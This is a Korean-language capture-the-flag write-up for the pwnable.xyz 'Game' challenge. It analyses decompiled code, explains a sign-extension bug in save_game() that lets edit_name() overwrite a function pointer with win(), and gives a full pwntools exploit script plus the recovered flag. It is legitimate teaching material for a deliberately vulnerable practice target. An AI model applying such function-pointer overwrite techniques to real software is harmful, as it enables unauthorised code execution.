# [pwnable.xyz] Game

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> Tired of math already? Try getting the highest score possible.
>
> Release: [Game.zip](https://github.com/h0meb0dy/pwnable.xyz/files/8947124/Game.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/104156058/174753907-96c25735-35ca-47ca-805f-988d72af1b8e.png)

## Analysis

### `win()`

```c
int win()
{
  return system("cat /flag");
}
```

`win()`이 실행되도록 하면 플래그를 획득할 수 있다.

### `struct game`

![image](https://user-images.githubusercontent.com/104156058/174791747-0761b13b-04dc-4a3f-824f-c53460b71f47.png)

게임의 정보는 하나의 청크에 저장된다. 이 청크는 `0x10`바이트 문자열 `name`과, 점수를 의미하는 `score`, 함수 포인터 `func`로 구성된다.

### `init_game()`

```c
game *init_game()
{
  game *result; // rax

  saves[0] = (game *)malloc(0x20uLL);
  cur = find_last_save();
  printf("Name: ");
  read(0, cur, 0x10uLL);
  result = cur;
  cur->func = play_game;
  return result;
}
```

`cur`에는 현재 진행되고 있는 게임에 해당하는 청크의 주소가 있고, `saves`에는 저장된 게임에 해당하는 청크의 주소들이 있다. 처음에는 둘 다 비어 있는데, `init_game()`에서는 새로운 게임을 만들어서 ` saves[0]`에 넣는다. `find_last_save()`는 가장 최근에 저장된 게임을 찾아오는 함수인데, 바로 전에 `saves[0]`에 저장한 게임을 찾아와서 `cur`에 넣게 된다.

그리고 나서 `name`을 입력받고, `func`에는 `play_game()`의 주소를 넣는다.

### play_game()

```c
  unsigned int num1; // [rsp+14h] [rbp-11Ch] BYREF
  unsigned int num2; // [rsp+18h] [rbp-118h]
  unsigned __int8 opsRandomIdx; // [rsp+1Ch] [rbp-114h]

  fd = open("/dev/urandom", 0);
  if ( fd == -1 )
  {
    puts("Can't open /dev/urandom");
    exit(1);
  }
  read(fd, &num1, 12uLL);
  close(fd);
  opsRandomIdx &= 3u;
```

 `/dev/urandom`으로부터 랜덤 값을 읽어와서 `num1`, `num2`, `opsRandomIdx`를 랜덤 값으로 설정한다.

![image](https://user-images.githubusercontent.com/104156058/174792888-8d4c89ef-c2a8-4612-9c98-42b61fff313f.png)

`ops`는 사칙연산 부호들의 배열이고, `opsRandomIdx`는 랜덤한 부호를 선택하는 역할을 한다.

```c
  memset(quiz, 0, 0x100uLL);
  snprintf(quiz, 0x100uLL, "%u %c %u = ", num1, (unsigned int)ops[opsRandomIdx], num2);
  printf("%s", quiz);
  answer = read_int32();
```

앞에서 설정한 `num1`, `num2`, `opsRandomIdx`를 이용하여 임의의 사칙연산 문제를 내고 답변을 받는다.

```c
  if ( opsRandomIdx == 1 )
  {
    if ( num1 - num2 == answer )
      newScore = cur->score + 1;
    else
      newScore = cur->score - 1;
    cur->score = newScore;
  }
  else if ( opsRandomIdx > 1u )
  {
    if ( opsRandomIdx == 2 )
    {
      if ( num1 / num2 == answer )
        v2 = cur->score + 1;
      else
        v2 = cur->score - 1;
      cur->score = v2;
    }
    else if ( opsRandomIdx == 3 )
    {
      if ( num2 * num1 == answer )
        v3 = cur->score + 1;
      else
        v3 = cur->score - 1;
      cur->score = v3;
    }
  }
  else if ( !opsRandomIdx )
  {
    if ( num2 + num1 == answer )
      v0 = cur->score + 1;
    else
      v0 = cur->score - 1;
    cur->score = v0;
  }
```

정답을 맞추면 `cur->score`를 1 증가시키고, 틀리면 1 감소시킨다.

### `main()`

```c
  init_game();
```

먼저 `init_game()`을 실행하여 새로운 게임을 만든다.

#### 1. Play game

```c
      if ( op != 1 )
        break;
      ((void (__fastcall *)(const char *, const char **))cur->func)("> ", argv);
```

`cur->func`에 있는 함수를 호출한다. 기본적으로 `init_game()`에서 `func`에 `play_game()`의 주소를 넣기 때문에 메모리가 조작되지 않는다면 `play_game()`이 실행된다.

#### 2. Save game

```c
      if ( op == 2 )
      {
        save_game();
      }
```

```c
game *__fastcall save_game()
{
  game *newSave; // rcx
  __int64 v1; // rdx
  game *result; // rax
  int i; // [rsp+Ch] [rbp-4h]

  for ( i = 1; i <= 4; ++i )
  {
    if ( !saves[i] )
    {
      saves[i] = (game *)malloc(0x20uLL);
      newSave = saves[i];
      v1 = *(_QWORD *)&cur->name[8];
      *(_QWORD *)newSave->name = *(_QWORD *)cur->name;
      *(_QWORD *)&newSave->name[8] = v1;
      *(_QWORD *)&saves[i]->name[16] = *(__int16 *)&cur->name[16];
      saves[i]->func = play_game;
      result = saves[i];
      cur = result;
      return result;
    }
  }
  LODWORD(result) = puts("Not enough space.");
  return result;
}
```

`saves`에 현재 진행 중인 게임의 상황을 저장한다. 즉, `cur`을 그대로 `saves`로 복사한다. 처음에 `init_game()`에서 `saves[0]`에 하나를 저장해서, 네 개의 게임만 추가적으로 저장할 수 있다.

#### 3. Edit name

```c
        if ( op != 3 )
          goto LABEL_13;
        edit_name();
```

```c
ssize_t edit_name()
{
  size_t len; // rax

  len = strlen(cur->name);
  return read(0, cur, len);
}
```

`cur->name`을 수정할 수 있다. `strlen()`으로 `name`의 길이를 구하고, 그 길이만큼 새로 문자열을 입력할 수 있다.

## Exploit

문제를 한 번 틀리면 점수가 0에서 1 감소하여 `0xffff`가 된다.

![image](https://user-images.githubusercontent.com/104156058/174793457-336e6c57-b189-4fc0-9d83-e870642921ea.png)

```c
      v1 = *(_QWORD *)&cur->name[8];
      *(_QWORD *)newSave->name = *(_QWORD *)cur->name;
      *(_QWORD *)&newSave->name[8] = v1;
      *(_QWORD *)&saves[i]->name[16] = *(__int16 *)&cur->name[16];
      saves[i]->func = play_game;
      result = saves[i];
      cur = result;
```

`save_game()`에서 `newSave`로 `cur`을 복사하는 코드를 잘 보면, 4번째 줄에서 점수를 복사할 때 2바이트 정수형 변수를 8바이트 정수형으로 바꿔서 복사하는 것을 확인할 수 있다. 따라서 앞에서 점수를 `-1`로 만든 상태에서 게임을 저장하면

![image](https://user-images.githubusercontent.com/104156058/174793926-fa2bfe95-b231-4d90-8f7a-63ea26206595.png)

점수가 `0xffffffffffffffff`가 된다. `cur`에도 복사된 게임의 주소(`0x6032c0`)가 들어간다.

이 상태에서 `edit_name()`을 실행하면, `strlen(cur->name)`의 반환값이 `0x1b`가 되어 `func`까지 원하는 값으로 덮어쓸 수 있다. `func`를 `win()`의 주소로 덮어쓰고 게임을 플레이하면 `play_game()`대신 `win()`이 실행되어 플래그를 획득할 수 있다.

### Full exploit

```python
from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/challenge')
else:
    r = remote('svc.pwnable.xyz', 30009)

sla = r.sendlineafter
sa = r.sendafter

def play_game(answer=None):
    sla('> ', '1')
    if answer is not None:
        sla('= ', str(answer))

def save_game():
    sla('> ', '2')

def edit_name(name):
    sla('> ', '3')
    r.send(name)

win = 0x4009d6

sa('Name: ', 'a' * 16)

play_game(0)
save_game()
edit_name(b'a' * 0x18 + p64(win)[:3])
play_game()

r.interactive()
```

```
$ python3 ex.py
[+] Opening connection to svc.pwnable.xyz on port 30009: Done
[*] Switching to interactive mode
FLAG{typ3_c0nv3rsi0n_checked}
```